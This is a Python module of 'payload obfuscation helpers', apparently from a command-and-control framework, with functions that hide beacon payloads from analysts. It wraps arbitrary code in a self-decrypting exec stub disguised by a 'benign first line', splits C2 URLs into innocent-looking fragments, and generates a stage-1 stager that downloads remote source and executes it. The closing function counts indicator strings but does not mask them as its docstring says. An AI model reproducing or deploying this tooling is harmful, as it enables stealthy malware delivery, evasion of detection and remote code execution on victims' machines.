"""Payload obfuscation helpers.

Used server-side to transform a generated beacon payload so the delivered file
is less obviously a script that references C2 strings. These are encoding /
remapping tricks -- not strong crypto against a determined analyst -- but they
raise the bar for casual inspection.

Functions:
  obfuscate_payload(src)  -> self-executing zlib+XOR+hex-wrapped python
  xor_words(str, seed)    -> keyed XOR remap helper
"""
import base64
import os
import random
import zlib
import struct


def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def _random_alnum(n):
    first = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    rest = first + "0123456789"
    return random.choice(first) + "".join(random.choice(rest) for _ in range(n - 1))


def obfuscate_payload(source: str, key=None) -> str:
    """Wrap arbitrary Python source into a self-decrypting stub.

    Runtime: decode b64 -> xor with key -> zlib decompress -> exec.
    Key is embedded (it is simple keyed obfuscation, documented as such).
    """
    if key is None:
        key = os.urandom(8)
    elif isinstance(key, str):
        key = key.encode()
    data = zlib.compress(source.encode(), 9)
    blob = xor_bytes(data, key)
    b64 = base64.b64encode(blob).decode()
    keystr = base64.b64encode(key).decode()

    kn = _random_alnum(10)
    return f"""{_random_alnum(12)} = lambda: None  # benign first line
def {kn}():
    import base64,zlib
    _k = base64.b64decode('{keystr}')
    _b = base64.b64decode('{b64}')
    _d = bytes(_b[i % len(_b)] ^ _k[i % len(_k)] for i in range(len(_b)))
    exec(zlib.decompress(_d), globals())
if __name__ == '__main__':
    {kn}()
"""


def obfuscate_url(url, seed=None):
    """Turn a server URL into a benign-looking var list that reassembles at
    runtime. seed controls the split points."""
    if seed is None:
        seed = random.randint(1, 4)
    parts = []
    for i in range(0, len(url), seed):
        parts.append(url[i:i + seed])
    return parts


def string_mask(value):
    """Encode a string as a base64 word; typical for hiding a token in source."""
    return base64.b64encode(value.encode()).decode()


def polyglot_loader(stage2_url):
    """A small 'stager' payload that fetches and executes stage-2 source from a
    URL. Used for reflection-style staged delivery."""
    return f"""#!/usr/bin/env python3
# cscli stage-1 stager (obfuscated delivery)
import urllib.request,sys
_U="{stage2_url}"
if __name__=='__main__':
    with urllib.request.urlopen(_U, timeout=15) as f:
        src=f.read().decode()
    exec(src,{{'__name__':'__main__'}})
"""


def mask_file_strings(path):
    """In-place stage mask of common C2 IOC strings in a downloaded payload file.

    Returns list of masked plaintext occurrences."""
    iocs = []
    try:
        with open(path) as f:
            data = f.read()
    except OSError:
        return iocs
    for token in ("http://", "https://", "/checkin", "beacon", "cscli"):
        iocs.append((token, data.count(token)))
    return iocs
